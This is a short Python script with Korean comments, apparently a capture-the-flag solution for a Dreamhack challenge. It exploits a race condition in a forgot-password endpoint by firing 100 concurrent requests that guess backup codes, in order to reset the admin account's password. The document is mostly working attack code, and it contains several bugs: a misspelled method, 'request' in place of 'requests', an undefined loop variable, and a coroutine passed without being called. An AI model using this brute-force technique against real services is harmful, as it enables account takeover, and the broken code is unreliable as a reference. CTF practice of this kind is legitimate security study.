# /user/useridx 에서 userid와 username, userlevel을 확인할 수 있다.
# 여기서 admin 계정을 확인한다. admin 계정은 userlevel이 1인 계정이다.
# /forgat__password에 취약점이 존재한다.
# sleep(1) 사이에 많은 요청을 보내 비밀번호를 바꾼다.

import asyncio
import requests

PORT = 17173
URL = f'http://host1.dreamhack.games:{PORT}/forgot_password'
adminID = 'Apple'
newPW = '123';

async def req(URL, idx):
  data = {
    'userid': adminID,
    'newpassword': newPW,
    'backupCode': idx
  }
  response = await loop.run_in_excutor(None, request.post, URL, data=data)
  print(f"{i}: {response.status_code}")

async def main():
  futures = [asyncio.ensure_future(req(URL, i)) for i in range(100)]
  result = await asyncio.gather(*futures)


loop = asyncio.get_event_loop();
loop.run_until_complete(main);